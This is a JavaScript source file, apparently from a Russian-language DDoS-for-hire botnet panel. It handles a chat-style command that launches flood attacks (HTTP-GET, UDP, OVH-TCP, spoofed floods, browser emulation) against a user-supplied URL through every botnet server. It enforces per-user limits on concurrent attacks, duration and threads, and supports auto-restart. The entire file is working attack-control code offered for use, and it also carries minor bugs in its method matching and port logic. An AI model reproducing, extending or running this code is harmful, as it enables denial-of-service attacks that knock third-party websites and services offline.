const CommandsCore = require('../../core')
const CommonData = require('../../../../common/data')
const center = require('../../../../utils/center')
const { isURLValid } = require('../../../../utils/url')
const sp = require('../../../../utils/sp')
const Botnet = require('../../../../botnet/core')
const sleep = require('../../../../utils/sleep')
const uuid = require('../../../../utils/uuid')
const config = require('../../../../../config')
const { clearWithLogo } = require('../../../../utils/logo')

CommandsCore.cmdInit(/^\!([A-Za-z0-9]+) (.*)$/i, async (client, command, args) => {
    const slots = CommonData.attacks.filter(x => (x.network === client.user.network || client.user.network === config.GlobalNetworkName)).length
    const maxSlots = client.user.network === config.GlobalNetworkName ? config.maxConcs * (Object.keys(CommonData.servers).length - 1) : config.maxConcs
    if(slots >= maxSlots) {
        client.write(clearWithLogo(client))
        return client.write(center('Нет свободных слотов, ожидайте окончания атак.'.red.italic, client.getWidth()) + '\n\n')
    }

    let method = null;

    if(args[1].toLowerCase() === 'hget') {
        method = "HTTP-GET";
    } else if(args[1].toLowerCase() === 'hgetv2') {
        method = "HTTP-GET+";
    } else if(args[1].toLowerCase() === 'OVH-TCP') {
        method = "OVH-TCP";
    } else if(args[1].toLowerCase() === 'UDP') {
        method = "UDP";
    } else if(args[1].toLowerCase() === 'spooflood') {
        method = "spooflood";
    } else if(args[1].toLowerCase() === 'mixed') {
        method = "MIXED";
    } else if(args[1].toLowerCase() === 'spider') {
        method = "SPIDER";
    } else if(args[1].toLowerCase() === 'spiderv2') {
        method = "SPIDER+";
    } else if(args[1].toLowerCase() === 'browser') {
        method = "Browser";
    } else if(args[1].toLowerCase() === 'browserv2') {
        method = "Browser+";
    } else if(args[1].toLowerCase() === 'raw') {
        method = "HTTP-RAW";
    } else return client.write(center('Недействительный метод.\n\n'.red.italic, client.getWidth()));

    args[1] = args[2];

    const url = args[1].split(" ")[0];
    let time = args[1].split(" ")[1];
    let threads = null;
    
    try{ 
        threads = args[1].split(args[1].split(" ")[1])[1].trim().split(" ")[0].trim();
    } catch {};

    let arInterval = null;

    try {
        arInterval = args[1].split(args[1].split(" ")[1])[1].trim().split(" ")[1].split(" ")[0].trim();
    } catch {};

    // let maxInstances = 5;

    // try{ 
    //     maxInstances = Number(args[1].split(args[1].split(" ")[1])[1].trim().split(" ")[1].trim()) || 100;
    // } catch (e) {};

    if(!isURLValid(url)) {
        return client.write(center('Неверный URL.\n\n'.red.italic, client.getWidth()))
    }

    if(!time || !time.match(/^([0-9]+)$/i)) {
        return client.write(center('Некорректное время атаки.\n\n'.red.italic, client.getWidth()))
    }
    if(!threads || !threads.match(/^([0-9]+)$/i)) {
        return client.write(center('Некорректное число потоков.\n\n'.red.italic, client.getWidth()))
    }

    time = Number(time);
    threads = Number(threads);

    //if(time > 86400) return ctx.r("⚠️ Максимальное время - 10.800 сек. (3 часа)");
    if(time < 30) {
        client.write(center('Минимальное время атаки - 30 сек.\n\n'.red.italic, client.getWidth()))
    }

    if(!client.user.admin) {
        const limits = client.user.limits
        if(!limits) {
            return client.write(center('Доступ запрещён.'.red.italic, client.getWidth()) + '\n\n')
        }
        if(CommonData.attacks.filter(x => x.sender === client.user.username).length >= limits.maxConcs) {
            return client.write(center(`Максимальное количество одновременных атак - ${limits.maxConcs}.\n\n`.red.italic, client.getWidth()))
        }
        if(time > limits.maxTime) return client.write(center(`Максимальное время атаки - ${sp(limits.maxTime)} сек.\n\n`.red.italic, client.getWidth()))
        if(limits.methods && limits.methods[method]) {
            let nowUserThreadsByThisMethod = 0
            for(const attack of CommonData.attacks.filter(x => x.sender === client.username && x.method === method)) {
                nowUserThreadsByThisMethod += attack.threads
            }
            const qty = limits.methods[method].threads - nowUserThreadsByThisMethod
            if(threads > qty) {
                return client.write(center(`Доступно потоков - ${qty}`.red.italic, client.getWidth()) + '\n\n')
            }
        } else {
            return client.write(center('Нет доступа к этому методу.\n\n'.red.italic, client.getWidth()))
        }
    }

    const port = url.startsWith("https:", "http:") ? "443" : "80";

    let tmpId = 100;

    while(CommonData.attacks.find(x => x.id === tmpId && Math.round((x.end - Date.now()) / 1000) >= 1)) {
        tmpId++;
    }

    let success = 0;
    let errors = 0;
    let internalErrors = 0;

    for(const server of CommonData.servers[client.user.network]) {
        const serverNum = Number(CommonData.servers[client.user.network].indexOf(server))
        let status = "OK".brightGreen
        const res = await Botnet.start(url, threads, time, method, tmpId, server);
        if(!res) {
            status = "ERROR".brightRed
            errors++;
        } else if(!res.success) {
            status = "INTERNAL ERROR".brightRed
            internalErrors++;
        } else success++;
        client.write(`Сервер №${serverNum + 1} `.brightWhite.bold + '.'.gray.repeat(client.getWidth() / 2 - serverNum.toString().length) + " " + status + '\n')
    }

    if(success < 1) {
        client.write(clearWithLogo(client))
        return client.write(center('Произошла ошибка, повторите попытку позже.'.red.italic, client.getWidth()) + '\n\n')
    }

    const attack = {
        id: tmpId,
        sender: client.username,
        url,
        port,
        method,
        threads,
        status: { success, errors, internalErrors },
        time,
        network: client.user.network,
        end: Date.now() + (time * 1000),
        uuid: uuid()
    }

    CommonData.attacks.push(attack);

    let totalAR = null

    if(client.user.admin || client.user.autorestart) {
        if(arInterval && Number(arInterval)) {
            totalAR = Number(arInterval)
            CommonData.autorestart.push({
                uuid: attack.uuid,
                interval: totalAR,
                waiting: 0
            })
        }
    }

    client.write(clearWithLogo(client))
    client.write('\t  Атака запущена!  '.bgGreen.brightWhite.bold + '\n\n'
    + '\tID: '.brightBlue + tmpId.toString().brightWhite + '\n'
    + '\tURL: '.brightBlue + url.brightWhite + '\n'
    + '\tMethod: '.brightBlue + method.brightWhite + '\n'
    + '\tThreads: '.brightBlue + threads.toString().brightWhite + '\n'
    + '\tTime: '.brightBlue + sp(time).brightWhite + ' seconds'.brightWhite + '\n'
    + '\tAuto-Restart: '.brightBlue + (totalAR ? sp(totalAR).brightWhite + ' seconds'.brightWhite : 'No'.brightWhite) + '\n\n'
    + '\tNetwork: '.brightBlue + client.user.network.brightWhite + '\n\n'
    + '\tSuccess: '.white + success.toString().green + '\n'
    + '\tErrors: '.white + errors.toString().red + '\n'
    + '\tInternalErrors: '.white + internalErrors.toString().red + '\n\n')
})